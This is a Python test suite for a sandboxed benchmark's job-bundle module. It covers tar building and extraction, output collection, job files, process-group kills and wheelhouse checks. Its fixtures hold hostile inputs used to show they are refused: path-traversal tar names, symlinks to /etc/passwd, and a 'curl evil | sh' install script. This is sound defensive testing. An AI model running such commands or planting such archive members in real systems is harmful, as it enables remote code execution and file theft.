# SPDX-License-Identifier: MIT
"""bundle.py: the job tar, the in-executor snippets, the job and check files, output collection, process-group kill
and the usable-result rule (spec 3.16)."""

from __future__ import annotations

import ast
import hashlib
import io
import json
import os
import shutil
import signal
import subprocess
import sys
import tarfile
import tempfile
import time
import unittest
from pathlib import Path

from mhforge import bundle, scan, util, workspace
from mhforge.errors import WorkspaceError
from mhforge.wire import JobIdentity
from tests.helpers import child_env, example_dir, make_manifest, needs_example_dir, tmp_state

HEX64 = "ab" * 32
JOB = JobIdentity("mh-test", "val", "no_memory", "USPTO", 1, "baseline", None)


def sha(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


def run_snippet(source: str, *args: str, timeout: float = 60) -> subprocess.CompletedProcess:
    return subprocess.run([sys.executable, "-c", source, *args], env=child_env(), capture_output=True, text=True,
                          timeout=timeout)


def make_tar(path: Path, members: list[tuple]) -> Path:
    """members: (name, bytes) for a regular file, or (name, TarInfo type, linkname) for anything else."""
    with tarfile.open(path, "w", format=tarfile.GNU_FORMAT) as tf:
        for item in members:
            info = tarfile.TarInfo(item[0])
            if len(item) == 2:
                info.size = len(item[1])
                tf.addfile(info, io.BytesIO(item[1]))
            else:
                info.type, info.linkname = item[1], item[2]
                tf.addfile(info)
    return path


class SyntheticTree:
    """A stand-in example directory, a workspace beside a pristine.json covering it, and a manifest."""

    FILES = bundle.PKG_FILES + bundle.PINNED_AGENT_FILES + (
        "data/uspto/train.jsonl", "data/uspto/val.jsonl", "data/uspto/test.jsonl", "data/symptom_diagnosis/val.jsonl",
        "data/README.md", "benchmark.py", "meta_harness.py", "claude_wrapper.py")

    def __init__(self, root: Path) -> None:
        self.ex = root / "ex"
        self.ws = root / "state" / "workspace" / "text_classification"
        files = {}
        for rel in self.FILES:
            data = f"# {rel}\n".encode()
            for base in (self.ex, self.ws):
                (base / rel).parent.mkdir(parents=True, exist_ok=True)
                (base / rel).write_bytes(data)
            files[rel] = sha(data)
        util.write_json(self.ws.parent / "pristine.json", {"schema": "mhforge.pristine/1", "source": str(self.ex),
                                                           "tree_sha256": util.tree_digest(files), "files": files})
        self.manifest = make_manifest()

    def agent(self, name: str, data: bytes = b"class A: pass\n") -> Path:
        path = self.ws / "agents" / name
        path.write_bytes(data)
        return path

    def build(self, dest: Path, **kw) -> dict:
        return bundle.build_bundle(self.ex, self.ws, "USPTO", self.manifest, dest, **kw)


class BundleSynthetic(unittest.TestCase):
    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp(prefix="mhf-bundle-"))
        self.tree = SyntheticTree(self.tmp)

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def test_agent_file_limits(self):
        t = self.tree
        t.agent("cand.py")
        (t.ws / "agents" / "__pycache__").mkdir()
        (t.ws / "agents" / "__pycache__" / "cand.cpython-313.pyc").write_bytes(b"\0")
        outside = self.tmp / "outside.py"
        outside.write_bytes(b"x = 1\n")
        os.symlink(outside, t.ws / "agents" / "linked.py")
        os.mkfifo(t.ws / "agents" / "pipe.py")
        (t.ws / "agents" / "subdir.py").mkdir()
        t.agent("big.py", b"#" * (bundle.MAX_AGENT_FILE_BYTES + 1))
        t.agent("exactly.py", b"#" * bundle.MAX_AGENT_FILE_BYTES)
        t.agent("my-agent.py")
        t.agent("notes.txt")
        info = t.build(self.tmp / "b.tar")
        agents = sorted(m for m in info["members"] if "/agents/" in m)
        self.assertEqual(agents, ["pkg/text_classification/agents/" + n for n in
                                  ("__init__.py", "cand.py", "exactly.py", "fewshot_all.py", "fewshot_memory.py",
                                   "no_memory.py")])
        reasons = {s["name"]: s["reason"] for s in info["skipped"]}
        self.assertEqual(reasons, {"agents/__pycache__": "pycache", "agents/linked.py": "symlink",
                                   "agents/pipe.py": "not_regular", "agents/subdir.py": "not_regular",
                                   "agents/big.py": "too_large", "agents/my-agent.py": "not_a_module_file",
                                   "agents/notes.txt": "not_a_module_file"})
        # review regression: a name that does not fit the USTAR name field made every bundle (baselines too) raise
        t.agent("a" * 98 + ".py")
        t.agent("b" * 97 + ".py")
        info = t.build(self.tmp / "long.tar")
        self.assertIn("pkg/text_classification/agents/" + "b" * 97 + ".py", info["members"])
        self.assertIn({"name": "agents/" + "a" * 98 + ".py", "reason": "name_too_long"}, info["skipped"])
        bundle.extract_bundle(self.tmp / "long.tar", self.tmp / "long-box")
        (t.ws / "agents" / ("a" * 98 + ".py")).unlink()
        (t.ws / "agents" / ("b" * 97 + ".py")).unlink()
        # the count limit is an error: the bundle must not silently differ from the workspace
        for i in range(bundle.MAX_AGENT_FILES - len(bundle.PINNED_AGENT_FILES) - 2 + 1):
            t.agent(f"extra_{i:03d}.py", b"")
        with self.assertRaises(WorkspaceError):
            t.build(self.tmp / "c.tar")

    def test_agent_override_bundles_stored_copy(self):
        t = self.tree
        t.agent("cand.py", b"edited after the proposal\n")
        stored = self.tmp / "stored_cand.py"
        stored.write_bytes(b"as proposed\n")
        info = t.build(self.tmp / "b.tar", agent_overrides={"cand": stored})
        self.assertEqual(info["members"]["pkg/text_classification/agents/cand.py"], sha(b"as proposed\n"))
        self.assertEqual(info["overridden"], ["cand"])
        with tarfile.open(self.tmp / "b.tar") as tf:
            self.assertEqual(tf.extractfile("pkg/text_classification/agents/cand.py").read(), b"as proposed\n")
        # an override for a candidate whose workspace file is gone is still bundled
        (t.ws / "agents" / "cand.py").unlink()
        info = t.build(self.tmp / "c.tar", agent_overrides={"cand": stored})
        self.assertIn("pkg/text_classification/agents/cand.py", info["members"])
        for bad in ("no_memory", "__init__", "Bad", "x\n"):
            with self.subTest(bad=bad), self.assertRaises(ValueError):
                t.build(self.tmp / "d.tar", agent_overrides={bad: stored})
        stored.write_bytes(b"#" * (bundle.MAX_AGENT_FILE_BYTES + 1))
        with self.assertRaises(WorkspaceError):
            t.build(self.tmp / "e.tar", agent_overrides={"cand": stored})

    def test_bundle_hash_checks_pinned_files_against_pristine(self):
        t = self.tree
        info = t.build(self.tmp / "a.tar")
        (t.ws / "llm.py").write_bytes(b"edited in the workspace\n")      # ignored: pinned files come from the example
        self.assertEqual(t.build(self.tmp / "b.tar")["sha256"], info["sha256"])
        (t.ex / "llm.py").write_bytes(b"the example changed\n")          # refused: differs from the pin
        with self.assertRaises(WorkspaceError):
            t.build(self.tmp / "c.tar")
        (t.ex / "llm.py").unlink()
        os.symlink(t.ws / "llm.py", t.ex / "llm.py")
        with self.assertRaises(WorkspaceError):
            t.build(self.tmp / "d.tar")
        os.unlink(t.ws.parent / "pristine.json")
        with self.assertRaises(WorkspaceError):
            t.build(self.tmp / "e.tar")
        with self.assertRaises(ValueError):
            bundle.build_bundle(t.ex, t.ws, "Nope", t.manifest, self.tmp / "f.tar")

    def test_extract_rejects_traversal_links_and_wrong_members(self):
        ok = ("pkg/text_classification/llm.py", b"x")
        cases = {
            "traversal": [ok, ("pkg/text_classification/../../evil.py", b"x")],
            "absolute": [("/tmp/evil.py", b"x")],
            "symlink": [("pkg/text_classification/agents/a.py", tarfile.SYMTYPE, "/etc/passwd")],
            "hardlink": [ok, ("pkg/text_classification/agents/a.py", tarfile.LNKTYPE, "pkg/text_classification/llm.py")],
            "device": [("bin/mhf_frames.py", tarfile.CHRTYPE, "")],
            "directory": [("pkg/text_classification/agents", tarfile.DIRTYPE, "")],
            "benchmark": [("pkg/text_classification/benchmark.py", b"x")],
            "other_bin": [("bin/tool.py", b"x")],
            "logs": [("pkg/text_classification/logs/x.json", b"x")],
            "duplicate": [ok, ok],
            "two_datasets": [("pkg/text_classification/data/uspto/val.jsonl", b"x"),
                             ("pkg/text_classification/data/symptom_diagnosis/val.jsonl", b"x")],
            "bundle_name": [("job.json", b"{}")],
        }
        for name, members in cases.items():
            with self.subTest(case=name):
                box = self.tmp / f"box-{name}"
                tar = make_tar(self.tmp / f"{name}.tar", members)
                with self.assertRaises(ValueError):
                    bundle.extract_bundle(tar, box)
                written = [p for p in box.rglob("*") if p.is_file()] if box.exists() else []
                self.assertEqual(written, [])                          # all members are checked before any write
                (box).mkdir(exist_ok=True)
                shutil.copy(tar, box / "bundle.tar")
                proc = run_snippet(bundle.EXTRACT_SNIPPET, str(box))
                self.assertEqual(proc.returncode, 1, proc.stderr)
                self.assertIn("refused", proc.stderr)
                self.assertFalse((box / "pkg").exists() or (box / "bin").exists())
        with self.assertRaises(ValueError):
            bundle.extract_bundle(self.tmp / "missing.tar", self.tmp / "box-missing")

    def test_snippets_extract_and_pack(self):
        box = self.tmp / "box"
        box.mkdir()
        info = self.tree.build(box / "bundle.tar")
        proc = run_snippet(bundle.EXTRACT_SNIPPET, str(box))
        self.assertEqual(proc.returncode, 0, proc.stderr)
        for d in bundle.BOX_DIRS:
            self.assertTrue((box / d).is_dir(), d)
        for member, digest in info["members"].items():
            self.assertEqual(util.sha256_file(box / member), digest)
            self.assertEqual((box / member).stat().st_mode & 0o777, 0o644)
        (box / "out" / "val.json").write_text('{"accuracy": 0.5}')
        (box / "out" / "log.jsonl").write_text("{}\n")
        (box / "out" / "stray.py").write_text("print(1)")
        os.symlink("/etc/hosts", box / "out" / "memory.json")
        (box / "run" / "exit.json").write_text('{"reason": "exit"}')
        (box / "run" / "u.sock").write_text("not packed")
        (box / "cache" / f"{HEX64}.json").write_text("{}")
        (box / "cache" / "notes.json").write_text("{}")
        proc = run_snippet(bundle.PACK_SNIPPET, str(box))
        self.assertEqual(proc.returncode, 0, proc.stderr)
        report = json.loads(proc.stdout)
        self.assertEqual(sorted(report["packed"]), ["out/log.jsonl", "out/val.json", "run/exit.json"])
        self.assertEqual(report["skipped"], [{"name": "out/memory.json", "reason": "link"}])
        with tarfile.open(box / "collect.tar") as tf:
            self.assertEqual(sorted(tf.getnames()), ["out/log.jsonl", "out/val.json", "run/exit.json"])
        proc = run_snippet(bundle.PACK_SNIPPET, str(box), "cache")
        self.assertEqual(proc.returncode, 0, proc.stderr)
        self.assertIn(f"cache/{HEX64}.json", json.loads(proc.stdout)["packed"])
        attempt = self.tmp / "attempt"
        outs = bundle.collect_outputs((box / "collect.tar").read_bytes(), attempt)
        self.assertEqual(outs, {"log.jsonl": sha(b"{}\n"), "val.json": sha(b'{"accuracy": 0.5}')})
        self.assertTrue((attempt / "cache" / f"{HEX64}.json").is_file())
        self.assertTrue(bundle.result_is_usable(attempt / "out" / "val.json"))


class JobFiles(unittest.TestCase):
    def env(self, **extra):
        env = {"PATH": "/usr/local/bin:/usr/bin:/bin", "HOME": "/mhf/home", "TMPDIR": "/mhf/tmp",
               "PYTHONPATH": "/mhf/pkg", "TEXT_CLASSIFICATION_LLM_CACHE_DIR": "/mhf/cache",
               "LITELLM_LOCAL_MODEL_COST_MAP": "True", "TIKTOKEN_RS_CACHE_DIR": "/opt/tok"}
        env.update(extra)
        return env

    ARGV = ("--memory", "agents/no_memory.py", "--dataset", "USPTO", "--val-output", "{out}/val.json",
            "--save-memory", "{out}/memory.json", "--log", "{out}/log.jsonl", "--load-memory", "{in}/memory.json")

    def job_file(self, manifest=None, job=JOB, **kw):
        args = dict(python="python3", box="/mhf", inner_argv=self.ARGV, env=self.env(), route=2, timeout_s=7200,
                    expect_outputs=("val.json",), manifest=manifest or make_manifest())
        args.update(kw)
        return bundle.build_job_file(job, **args)

    def test_worker_command_with_and_without_capture(self):
        cmd = bundle.worker_command("python3", "/mhf", self.ARGV, capture=True, max_text_chars=20000)
        self.assertEqual(cmd[:7], ["python3", "/mhf/bin/mhf_capture_entry.py", "--sidecar", "/mhf/out/sidecar.jsonl",
                                   "--max-text-chars", "20000", "--"])
        self.assertEqual(cmd[7:], ["--memory", "agents/no_memory.py", "--dataset", "USPTO", "--val-output",
                                   "/mhf/out/val.json", "--save-memory", "/mhf/out/memory.json", "--log",
                                   "/mhf/out/log.jsonl", "--load-memory", "/mhf/in/memory.json"])
        plain = bundle.worker_command("/v/bin/python", "/s/a1/box", self.ARGV + ("--api-base", "{api_base}"),
                                      capture=False, max_text_chars=20000)
        self.assertEqual(plain[:3], ["/v/bin/python", "-m", "text_classification.inner_loop"])
        self.assertEqual(plain[3:], [a.replace("/mhf", "/s/a1/box") for a in cmd[7:]]
                         + ["--api-base", "{api_base}"])          # {api_base} is the stub's to replace
        with self.assertRaises(ValueError):
            bundle.worker_command("python3", "/mhf", self.ARGV, capture=True, max_text_chars=0)

    def test_job_file_shape_and_no_secret(self):
        doc = self.job_file()
        self.assertEqual(set(doc), {"schema", "job_id", "argv", "env", "cwd", "route", "port", "timeout_s",
                                    "reply_timeout_s", "ping_interval_s", "pong_timeout_s", "max_request_bytes",
                                    "run_dir", "expect_outputs", "vocab_file", "repeat", "sample", "probe_endpoints",
                                    "expect"})
        self.assertEqual(doc["schema"], "mhforge.jobfile/1")
        self.assertEqual(doc["job_id"], "val.no_memory.USPTO.a1")
        self.assertEqual((doc["cwd"], doc["run_dir"], doc["port"], doc["route"], doc["timeout_s"]),
                         ("/mhf/pkg", "/mhf/run", 0, 2, 7200))
        self.assertEqual(doc["expect_outputs"], ["/mhf/out/val.json"])
        self.assertEqual(doc["max_request_bytes"], 4000000)
        self.assertEqual(doc["argv"][1], "/mhf/bin/mhf_capture_entry.py")            # capture.enabled from the manifest
        self.assertEqual(doc["env"], dict(sorted(self.env().items())))
        self.assertEqual(scan.scan_obj(doc), [])
        self.assertEqual(self.job_file(capture=False)["argv"][1:3], ["-m", "text_classification.inner_loop"])
        self.assertEqual(self.job_file(make_manifest({"capture.enabled": False}))["argv"][1], "-m")
        # never a key or a token
        for env in (self.env(OPENROUTER_API_KEY="mhf-relay"), self.env(MHFORGE_FORGE_API_KEY="x"),
                    self.env(GITHUB_TOKEN="x"), self.env(NOTE="mhfjob_" + "A" * 43),
                    self.env(NOTE="Bearer abcdefghijklmnopqrstuvwxyz")):
            with self.subTest(env=sorted(env)), self.assertRaises(ValueError):
                self.job_file(env=env)
        with self.assertRaises(ValueError):
            self.job_file(inner_argv=("--api-key", "sk-or-" + "a" * 30))
        with self.assertRaises(ValueError):
            self.job_file(route=3)
        json.dumps(doc, allow_nan=False)

    def test_job_file_uses_vocab_file_and_ping_fields(self):
        m = make_manifest({"relay.reply_timeout_s": 77, "relay.ping_interval_s": 5, "relay.pong_timeout_s": 9})
        doc = self.job_file(m)
        self.assertEqual(doc["vocab_file"], bundle.VOCAB_FILE)
        self.assertNotIn("tokenizer_file", doc)
        self.assertEqual((doc["reply_timeout_s"], doc["ping_interval_s"], doc["pong_timeout_s"]), (77, 5, 9))
        self.assertEqual(scan.scan_obj(doc), [])       # the 40-hex name next to "vocab" is no keyed-secret finding
        self.assertIsNone(self.job_file(vocab_file=None)["vocab_file"])
        with self.assertRaises(ValueError):
            self.job_file(vocab_file="../etc/passwd")

    def test_job_file_carries_repeat_sample_probe_endpoints_and_expect(self):
        doc = self.job_file()
        self.assertEqual((doc["repeat"], doc["sample"], doc["probe_endpoints"]), (None, None, []))
        self.assertEqual(doc["expect"], {"machine": "x86_64", "python": "3.13", "freeze_sha256": None})
        job = JobIdentity("mh-test", "val", "no_memory", "USPTO", 2, "calibration", None, repeat=3, sample=4)
        m = make_manifest({"sandbox.object_store_endpoint": "objects.example.net:443",
                           "sandbox.expect.machine": "aarch64", "sandbox.expect.python": "3.12"})
        doc = self.job_file(m, job=job, expect_freeze_sha256=HEX64)
        self.assertEqual(doc["job_id"], "val.no_memory.USPTO.r3.s4.a2")
        self.assertEqual((doc["repeat"], doc["sample"]), (3, 4))
        self.assertEqual(doc["probe_endpoints"], ["objects.example.net:443"])
        self.assertEqual(doc["expect"], {"machine": "aarch64", "python": "3.12", "freeze_sha256": HEX64})
        with self.assertRaises(ValueError):
            self.job_file(expect_freeze_sha256="xyz")

    def test_check_file_shape(self):
        m = make_manifest()
        doc = bundle.build_check_file(python="python3", box="/mhf", env=self.env(), manifest=m)
        self.assertEqual(doc["job_id"], "import_check")
        self.assertEqual((doc["argv"], doc["expect_outputs"]), ([], []))
        self.assertEqual((doc["cwd"], doc["run_dir"], doc["env"]), ("/mhf/pkg", "/mhf/run", dict(sorted(self.env().items()))))
        self.assertEqual(doc["timeout_s"], 30)
        self.assertEqual(doc["vocab_file"], bundle.VOCAB_FILE)
        self.assertEqual(set(doc), set(self.job_file()))
        self.assertEqual(scan.scan_obj(doc), [])
        with self.assertRaises(ValueError):
            bundle.build_check_file(python="python3", box="/mhf", env=self.env(OPENROUTER_API_KEY="x"), manifest=m)
        # the stub is never started with it: it refuses an empty argv before doing anything
        with tempfile.TemporaryDirectory(prefix="mhf-chk-") as tmp:
            path = Path(tmp) / "check.json"
            util.write_json(path, bundle.build_check_file(python=sys.executable, box=tmp, env=self.env(), manifest=m,
                                                          vocab_file=None))
            stub = Path(bundle.__file__).parent / "insandbox" / "mhf_relay_stub.py"
            proc = subprocess.run([sys.executable, str(stub), "serve", "--job", str(path), "--uplink", "stdio"],
                                  env=child_env(), capture_output=True, timeout=30, stdin=subprocess.DEVNULL)
            self.assertEqual(proc.returncode, 2)
            check = Path(bundle.__file__).parent / "insandbox" / "mhf_selfcheck.py"
            proc = subprocess.run([sys.executable, str(check), "--job", str(path)], env=child_env(),
                                  capture_output=True, text=True, timeout=60)
            report = json.loads(proc.stdout)
            self.assertNotIn("job_file: unreadable", report["expect_problems"])
            self.assertIs(report["vocab_file_present"], True)          # vocab_file null: the check is skipped


class Collect(unittest.TestCase):
    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp(prefix="mhf-collect-"))

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def test_collect_outputs_allow_list_caps_and_rehash(self):
        box = self.tmp / "box"
        for d in ("out", "run", "cache"):
            (box / d).mkdir(parents=True)
        (box / "out" / "val.json").write_bytes(b'{"accuracy": 1}')
        (box / "out" / "sidecar.jsonl").write_bytes(b"{}\n")
        (box / "out" / "log.jsonl").write_bytes(b"x" * 2000)                 # over the small cap below
        (box / "out" / "extra.py").write_bytes(b"print(1)")
        os.symlink("/etc/hosts", box / "out" / "memory.json")
        (box / "run" / "stdout.txt").write_bytes(b"hello")
        (box / "run" / "stub.ready").write_bytes(b"{}")
        (box / "cache" / f"{HEX64}.json").write_bytes(b"{}")
        attempt = self.tmp / "a1"
        outs = bundle.collect_outputs(box, attempt, max_file_bytes=1000)
        self.assertEqual(outs, {"sidecar.jsonl": sha(b"{}\n"), "val.json": sha(b'{"accuracy": 1}')})
        self.assertEqual(sorted(p.relative_to(attempt).as_posix() for p in attempt.rglob("*") if p.is_file()),
                         sorted(["collect.json", "out/sidecar.jsonl", "out/val.json", "run/stdout.txt",
                                 f"cache/{HEX64}.json"]))
        report = util.read_json(attempt / "collect.json")
        self.assertEqual({s["name"]: s["reason"] for s in report["skipped"]},
                         {"out/log.jsonl": "too_large", "out/memory.json": "link"})
        self.assertEqual(report["copied"]["run/stdout.txt"], sha(b"hello"))
        # total cap: the second file that would pass the total is skipped
        outs = bundle.collect_outputs(box, self.tmp / "a2", max_total_bytes=20)     # 15 + 3 fit, then nothing more
        self.assertEqual(sorted(outs), ["sidecar.jsonl", "val.json"])
        self.assertFalse((self.tmp / "a2" / "run" / "stdout.txt").exists())
        # tar source: unsafe names, links, devices and other names are never written
        tar = make_tar(self.tmp / "c.tar", [
            ("out/val.json", b'{"accuracy": 0.25}'), ("../out/val.json", b"evil"), ("/abs/x", b"evil"),
            ("out/memory.json", tarfile.SYMTYPE, "/etc/passwd"), ("run/exit.json", tarfile.CHRTYPE, ""),
            ("out/../../escape.json", b"evil"), ("out/sub/val.json", b"evil"), ("cache/short.json", b"{}"),
            ("out/val.json", b"second copy"), ("run/stderr.txt", b"e" * 50)])
        attempt = self.tmp / "a3"
        outs = bundle.collect_outputs(tar.read_bytes(), attempt, max_file_bytes=40)
        self.assertEqual(outs, {"val.json": sha(b'{"accuracy": 0.25}')})
        self.assertFalse((self.tmp / "escape.json").exists() or (self.tmp / "out").exists())
        reasons = sorted((s["name"], s["reason"]) for s in util.read_json(attempt / "collect.json")["skipped"])
        self.assertEqual(reasons, sorted([("../out/val.json", "unsafe_name"), ("/abs/x", "unsafe_name"),
                                          ("out/memory.json", "not_regular"), ("run/exit.json", "not_regular"),
                                          ("out/../../escape.json", "unsafe_name"), ("out/sub/val.json", "not_allowed"),
                                          ("cache/short.json", "not_allowed"), ("out/val.json", "duplicate"),
                                          ("run/stderr.txt", "too_large")]))
        # the host re-hash: what is returned is the hash of the bytes now on disk
        self.assertEqual(util.sha256_file(attempt / "out" / "val.json"), outs["val.json"])
        with self.assertRaises(ValueError):
            bundle.collect_outputs(b"not a tar at all" * 40, self.tmp / "a4")

    def test_result_is_usable_matches_upstream_rule(self):
        upstream = None
        bench = example_dir() / "benchmark.py"
        if bench.is_file():                        # the real function, compiled from upstream's source (L171-L176)
            tree = ast.parse(bench.read_text(encoding="utf-8"))
            node = next(n for n in tree.body if isinstance(n, ast.FunctionDef) and n.name == "_has_usable_result")
            ns = {"json": json, "Path": Path}
            exec(compile(ast.Module(body=[node], type_ignores=[]), "benchmark.py", "exec"), ns)
            upstream = ns["_has_usable_result"]
        cases = ['{"accuracy": 0.5}', '{"accuracy": 1}', '{"accuracy": true}', '{"accuracy": NaN}', '{"accuracy": null}',
                 '{"accuracy": "0.5"}', '{"total": 3}', '[1, 2]', '0.5', 'not json', '', '{"accuracy": [0.5]}']
        expected = [True, True, True, True, False, False, False, False, False, False, False, False]
        for i, (text, want) in enumerate(zip(cases, expected)):
            path = self.tmp / f"r{i}.json"
            path.write_text(text, encoding="utf-8")
            with self.subTest(text=text):
                self.assertEqual(bundle.result_is_usable(path), want)
                if upstream is not None:
                    self.assertEqual(upstream(path), want)
        self.assertFalse(bundle.result_is_usable(self.tmp / "absent.json"))
        bad = self.tmp / "bad.json"
        bad.write_bytes(b"\xff\xfe{")
        self.assertFalse(bundle.result_is_usable(bad))
        # review regression: a deeply nested file raised RecursionError out of the host's check
        bad.write_text("[" * 200_000 + "]" * 200_000, encoding="utf-8")
        self.assertFalse(bundle.result_is_usable(bad))

    def test_collect_outputs_never_follows_a_linked_subdirectory(self):
        # review regression: with box/out a symlink, files of the link's target were copied as outputs
        box = self.tmp / "box"
        elsewhere = self.tmp / "elsewhere"
        for d in (box / "run", elsewhere):
            d.mkdir(parents=True)
        (elsewhere / "val.json").write_text('{"accuracy": 1}')
        (elsewhere / f"{HEX64}.json").write_text("{}")
        (box / "run" / "exit.json").write_text("{}")
        os.symlink(elsewhere, box / "out")
        os.symlink(elsewhere, box / "cache")
        attempt = self.tmp / "a1"
        self.assertEqual(bundle.collect_outputs(box, attempt), {})
        self.assertFalse((attempt / "out").exists() or (attempt / "cache").exists())
        report = util.read_json(attempt / "collect.json")
        self.assertEqual(sorted(report["copied"]), ["run/exit.json"])
        self.assertEqual(sorted((s["name"], s["reason"]) for s in report["skipped"]),
                         [("cache", "link"), ("out", "link")])


class KillGroup(unittest.TestCase):
    def wait_gone(self, pgid: int, limit: float = 5.0) -> bool:
        end = time.monotonic() + limit
        while time.monotonic() < end:
            try:
                os.killpg(pgid, 0)
            except (ProcessLookupError, PermissionError):
                return True
            time.sleep(0.05)
        return False

    def test_kill_group(self):
        # a leader and a grandchild in one group: SIGTERM reaches both
        proc = subprocess.Popen(["/bin/sh", "-c", "sleep 30 & sleep 30; wait"], start_new_session=True,
                                env=child_env())
        time.sleep(0.3)
        t0 = time.monotonic()
        bundle.kill_group(proc.pid, term_wait_s=5)
        self.assertLess(time.monotonic() - t0, 4.5)
        self.assertEqual(proc.wait(timeout=5), -signal.SIGTERM)
        self.assertTrue(self.wait_gone(proc.pid))
        # a group that ignores SIGTERM is killed after term_wait_s
        code = "import signal, time; signal.signal(signal.SIGTERM, signal.SIG_IGN); print('ready', flush=True); time.sleep(60)"
        proc = subprocess.Popen([sys.executable, "-c", code], start_new_session=True, env=child_env(),
                                stdout=subprocess.PIPE, text=True)
        self.assertEqual(proc.stdout.readline().strip(), "ready")
        t0 = time.monotonic()
        bundle.kill_group(proc.pid, term_wait_s=0.5)
        self.assertGreaterEqual(time.monotonic() - t0, 0.45)
        self.assertEqual(proc.wait(timeout=5), -signal.SIGKILL)
        proc.stdout.close()
        # an ended group is no error
        bundle.kill_group(proc.pid, term_wait_s=0.1)
        with self.assertRaises(ValueError):
            bundle.kill_group(1)


@needs_example_dir
class BundleExample(unittest.TestCase):
    def setUp(self):
        self.ex = example_dir()
        digest, _ = workspace.source_digest(self.ex)
        self.ctx = tmp_state(manifest=make_manifest({"upstream.tree_sha256": digest}))
        self.state = self.ctx.__enter__()
        self.ws = workspace.ensure_workspace(self.state.manifest, self.state.paths, self.ex, None)
        self.manifest = self.state.manifest

    def tearDown(self):
        self.ctx.__exit__(None, None, None)

    def build(self, name: str, dataset: str = "USPTO") -> tuple[dict, bytes]:
        dest = self.state.sc / name
        info = bundle.build_bundle(self.ex, self.ws, dataset, self.manifest, dest)
        return info, dest.read_bytes()

    def test_bundle_is_deterministic_and_minimal(self):
        info1, blob1 = self.build("a.tar")
        time.sleep(1.1)                            # a later mtime on disk must not change the bytes
        info2, blob2 = self.build("b.tar")
        self.assertEqual(blob1, blob2)
        self.assertEqual(info1["sha256"], sha(blob1))
        self.assertEqual(info1["bytes"], len(blob1))
        self.assertEqual(info1, info2)
        p = "pkg/text_classification/"
        expected = {p + r for r in bundle.PKG_FILES + bundle.PINNED_AGENT_FILES}
        expected |= {p + f"data/uspto/{s}.jsonl" for s in ("train", "val", "test")}
        expected |= {"bin/" + f for f in bundle.INSANDBOX_FILES}
        self.assertEqual(set(info1["members"]), expected)
        for absent in ("benchmark.py", "meta_harness.py", "claude_wrapper.py", "README.md", "pyproject.toml"):
            self.assertNotIn(p + absent, info1["members"])
        with tarfile.open(fileobj=io.BytesIO(blob1)) as tf:
            members = tf.getmembers()
            self.assertEqual([m.name for m in members], sorted(m.name for m in members))
            for m in members:
                self.assertTrue(m.isreg())
                self.assertEqual((m.mtime, m.uid, m.gid, m.mode, m.uname, m.gname), (0, 0, 0, 0o644, "", ""))
        pristine = util.read_json(self.state.paths.pristine)["files"]
        for name, digest in info1["members"].items():
            if name.startswith(p):
                self.assertEqual(digest, pristine[name[len(p):]])
        other, _ = self.build("c.tar", "Symptom2Disease")
        self.assertEqual({m for m in other["members"] if "/data/" in m and m.endswith(".jsonl")},
                         {p + f"data/symptom_diagnosis/{s}.jsonl" for s in ("train", "val", "test")})

    def test_bundle_ignores_workspace_edits_to_pinned_files(self):
        before, blob = self.build("a.tar")
        for rel in ("inner_loop.py", "llm.py", "config.yaml", "data/api.py", "data/uspto/val.jsonl",
                    "agents/no_memory.py"):
            with open(self.ws / rel, "ab") as fh:
                fh.write(b"\n# edited by a proposer\n")
        (self.ws / "agents" / "my_candidate.py").write_bytes(b"# candidate\n")
        after, _ = self.build("b.tar")
        p = "pkg/text_classification/"
        for name, digest in before["members"].items():
            self.assertEqual(after["members"][name], digest, name)
        self.assertEqual(set(after["members"]) - set(before["members"]), {p + "agents/my_candidate.py"})
        # the bundle extracts on the host into the work tree
        box = self.state.sc / "box"
        bundle.extract_bundle(self.state.sc / "a.tar", box)
        self.assertEqual(util.sha256_file(box / "pkg/text_classification/llm.py"), before["members"][p + "llm.py"])


class Wheelhouse(unittest.TestCase):
    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp(prefix="mhf-wh-"))

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def house(self, name: str, *, wheels: dict, sums: dict | None = None, extra: list | None = None) -> Path:
        box = self.tmp / name
        box.mkdir()
        listed = wheels if sums is None else sums
        text = "".join(f"{sha(data)}  wheels/{w}\n" for w, data in sorted(listed.items())).encode()
        members = [(f"wheels/{w}", data) for w, data in sorted(wheels.items())]
        members += [("SHA256SUMS", text), ("requirements.lock.txt", b"a==1.0 --hash=sha256:00\n")] + (extra or [])
        make_tar(box / "wheelhouse.tar", members)
        return box

    def test_wheelhouse_snippet_verifies_and_rejects(self):
        wheels = {"alpha-1.0-py3-none-any.whl": b"alpha wheel", "beta-2.0-cp313-cp313-manylinux_2_28_x86_64.whl": b"b"}
        box = self.house("good", wheels=wheels)
        proc = run_snippet(bundle.WHEELHOUSE_SNIPPET, str(box))
        self.assertEqual(proc.returncode, 0, proc.stderr)
        with tarfile.open(box / "wheelhouse.tar") as tf:
            sums = tf.extractfile("SHA256SUMS").read()
        self.assertEqual(proc.stdout.strip(), sha(sums))
        self.assertTrue((box / "wheelhouse" / "wheels" / "alpha-1.0-py3-none-any.whl").is_file())
        bad_cases = {
            "changed_wheel": dict(wheels={**wheels, "alpha-1.0-py3-none-any.whl": b"tampered"}, sums=wheels),
            "unlisted_wheel": dict(wheels={**wheels, "gamma-1.0-py3-none-any.whl": b"g"}, sums=wheels),
            "unexpected_member": dict(wheels=wheels, extra=[("install.sh", b"curl evil | sh")]),
            "traversal": dict(wheels=wheels, extra=[("wheels/../../x.whl", b"x")]),
            "link": dict(wheels=wheels, extra=[("wheels/link.whl", tarfile.SYMTYPE, "/etc/passwd")]),
        }
        for name, kw in bad_cases.items():
            with self.subTest(case=name):
                box = self.house(name, **kw)
                proc = run_snippet(bundle.WHEELHOUSE_SNIPPET, str(box))
                self.assertNotEqual(proc.returncode, 0)
                self.assertEqual(proc.stdout.strip(), "")
        box = self.tmp / "no_sums"
        box.mkdir()
        make_tar(box / "wheelhouse.tar", [("wheels/a.whl", b"a"), ("requirements.lock.txt", b"")])
        self.assertNotEqual(run_snippet(bundle.WHEELHOUSE_SNIPPET, str(box)).returncode, 0)


if __name__ == "__main__":
    unittest.main()
